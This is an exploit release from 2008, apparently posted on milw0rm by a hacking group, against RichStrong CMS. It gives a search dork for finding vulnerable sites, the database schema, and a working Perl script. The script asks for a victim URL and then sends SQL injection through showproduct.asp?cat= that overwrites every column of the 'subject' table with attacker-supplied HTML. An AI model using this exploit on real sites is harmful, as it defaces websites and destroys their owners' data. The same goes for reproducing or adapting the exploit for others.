--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+         RichStrong CMS  (showproduct.asp?cat=) Remote SQL Injection Exploit        +==--
--==+====================================================================================+==--
                     [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]

[+] Info:

[~] Software: RichStrong CMS
[~] HomePage: http://www.hzrich.cn
[~] Exploit: Remote Sql Injection [High]
[~] Where: showproduct.asp?cat=
[~] Bug Found By: JosS
[~] Contact: sys-project[at]hotmail.com
[~] Web: http://www.spanish-hackers.com
[~] Dork: "Power by:RichStrong CMS"
[~] Dork2: Priv8, xD!

[+] Tables:

[*] Table 1: subject

[+] Columns:

[*] Column 1: id
[*] Column 2: subjectname
[*] Column 3: subjecttype
[*] Column 4: displayorder
[*] Column 5: description
[*] Column 6: layout
[*] Column 7: style
[*] Column 8: category
[*] Column 9: workflowID_R
[*] Column 10: workflowID_S
[*] Column 11: status
[*] Column 12: owner
[*] Column 13: isinherit
[*] Column 14: doclistcount
[*] Column 15: docstyle
[*] Column 16: docsecrettype
[*] Column 17: docpubdays
[*] Column 18: wwwname
[*] Column 19: logo
[*] Column 20: contactus

[+] Exploit:


#!/usr/bin/perl

# RichStrong CMS - Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team
# www.spanish-hackers.com

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = "";
if (index(lc($SO),"win")!=-1){
		   $linux="0";
	    }else{
		    $linux="1";
	    }
		if($linux){
system("clear");
}
else{
system("cls");
system ("title RichStrong CMS - Remote SQL Injection Exploit - By JosS");
system ("color 02");
}

}

#*************************** expl ******************************


&lw;

print "\t\t########################################################\n\n";
print "\t\t#    RichStrong CMS - Remote SQL Injection Exploit     #\n\n";
print "\t\t#                        by JosS                       #\n\n";
print "\t\t########################################################\n\n";

print "Url Victim (Ex: www.localhost/showproduct.asp?cat=):  ";
$host=<STDIN>;
chomp $host;
print "\n";

  if ( $host   !~   /^http:/ ) {

    # lo aÃ±adimos
    $host = 'http://' . $host;
}


print "Message: ";
$message=<STDIN>;
chomp $message;
print "\n";

@columnas=("id","subjectname","subjecttype","displayorder","description","layout","style","category","workflowID_R","workflowID_S","status","owner",
"isinherit","doclistcount","docstyle","docsecrettype","docpubdays","wwwname","logo","contactus");


for ($i=0;$i<=21;$i++)

{

$comando="'%20update%20subject%20set%20$columnas[$i]='<h1>$message'--";
$comando =~ s/ /+/g;

my $final = $host.$comando;
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;

print "update: $columnas[$i]\n";

}



--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+                                       JosS                                         +==--
--==+====================================================================================+==--
                                       [+] [The End]

# milw0rm.com [2008-01-14]
